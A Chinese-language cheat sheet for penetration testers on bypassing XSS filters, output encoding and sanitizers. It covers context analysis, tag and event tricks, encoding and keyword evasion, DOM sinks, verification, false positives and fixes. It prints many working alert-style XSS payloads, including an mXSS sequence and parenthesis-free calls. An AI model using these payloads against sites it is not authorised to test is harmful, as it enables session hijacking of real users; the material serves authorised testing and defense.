# XSS 过滤与编码绕过

> 面向"有过滤/有编码/有 CSP"的现代 XSS 场景。CSP 专项见 `Browser-Side-Bypass/CSP-Bypass.md`。核心原则：**先定位上下文，再选语法缝隙**；不要盲撒 payload 列表。

## 先做上下文判定

| 上下文 | 关键问句 | 典型突破口 |
|---|---|---|
| HTML 文本 | 尖括号是否被实体化 | 标签注入、事件属性 |
| 属性内（双/单/无引号） | 引号与空格是否存活 | 闭合引号 + 新属性 |
| `href`/`src` | 协议白名单 | `javascript:`、`data:text/html` |
| JS 字符串 | 引号/反斜杠/换行是否转义 | `\` 断链、模板串 `${}`、`</script>` |
| JS 代码位 | 直接拼进执行上下文 | 直接表达式注入，无需 `alert(1)` |
| DOM sink | `innerHTML`/`eval`/`srcdoc` | DOM clobbering、原型污染（见 Browser-Side-Bypass） |

## 标签与事件缺口（现代浏览器仍有效）

- 自闭合与异常嵌套：`<svg><script>alert(1)</script>`、`<svg onload=...>`、`<iframe srcdoc=...>`、`<details open ontoggle=...>`、`<marquee onstart=...>`、`<video><source onerror=...>`。
- `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` —— **mXSS 经典序列**：浏览器重解析后标签边界改变。
- SVG 内 `<foreignObject>`、`<animate>`、`<set attributeName=...>` 可绕过只查 `on*` 的过滤器。
- `data:` 与 `blob:`：`<object data="data:text/html;base64,...">`、`<iframe src="data:text/html,...">`。
- `srcdoc` 内可再嵌完整文档，绕过对父级属性的过滤。

## 编码绕过

1. **HTML 实体/数字引用**：`&#x61;`、`&#97;`、`&colon;`（`javascript&colon;`）。
2. **URL 编码+HTML 混合**：`%26%23x61%3B` 双层解码顺序差异。
3. **Unicode 归一化**：全角字符、`U+FF1C`（＜）、best-fit 映射（`＜`→`<`）。见 `WAF-Bypass/Parser-Confusion-Bypass.md`。
4. **大小写与空白**：`OnErRoR`、`\t`/`\n`/`\f`/`\r`/`\x00` 插入关键字中。
5. **JS 转义绕过**：`\u0061lert`、`\x61lert`、模板串 `${alert(1)}`、`[].find.constructor` 类无括号调用。
6. **注释/标签内注释**：`<!--<img src=x onerror=alert(1)>-->`、`<![CDATA[` 在 XML/SVG 上下文。

## 关键字过滤绕过

- 分割：`<img src=x onerror="ale"+"rt(1)">`、`window["ale"+"rt"](1)`。
- 替代 API：`confirm`、`print`、`globalThis`、`top`、`frames`。
- 无括号：`` `${alert(1)}` ``、`onerror=location=name`、`throw onerror=eval`。
- HTMLCollection toString gadget：`<form><input name=x>` + `x.toString` 等隐式转换链（Vega CVE-2025-59840 系列）；同族可构造 `valueOf` 触发**无参数函数调用**绕过 WAF。

## DOM XSS 与 sanitizer

- 关注 `location.hash/search` 流向 `innerHTML`、`insertAdjacentHTML`、`document.write`、`jQuery.html()`、`$.parseHTML`。
- 库版本缺口：旧版 jQuery `<option>`、`DOMPurify` 绕过（见 `Browser-Side-Bypass/Sanitizer-and-mXSS-Bypass.md`）。
- Angular/Vue/React 的 `dangerouslySetInnerHTML`、`v-html`、模板编译 sink。

## 验证（最小证据）

1. 明确上下文与注入点（附请求与响应片段）。
2. 有可复现的执行证据：`alert`/弹窗、DOM 变更、或**无可视化弹窗时**用 DOM 变更 + console 输出（如 `document.title=1`）作为证据。
3. 说明是否能在受害者会话中携带 Cookie/Token 完成敏感操作（是否 HttpOnly、是否 CSP 限制）。

## 常见误报

- payload 出现在源码里但**位于编码后的位置**，浏览器不执行 → 必须验证实际 DOM/执行。
- 只有 `alert` 关键字被过滤后原样输出，未形成可执行 JS。
- 仅 `srcdoc`/属性注入成功但没有同源脚本执行路径（属于 HTML 注入，影响力需重新评估）。
- 报告"反射型 XSS"但参数仅在 `Content-Type: application/json` 响应中反射。

## 修复

- 上下文感知输出编码；避免 `innerHTML`，使用 `textContent`/`createElement`。
- 白名单 HTML 净化（最新版 DOMPurify，并服务端二次净化）。
- 严格 CSP（nonce + `strict-dynamic`）作为纵深防御，不作为唯一修复。
- 对 URL 属性做协议白名单校验，拒绝 `javascript:`/`data:`。

## 工具

`dalfox`、`xsstrike` 类扫描器仅做线索；`katana` 抓 DOM 端点；`browser-extension`/无头浏览器做执行验证。
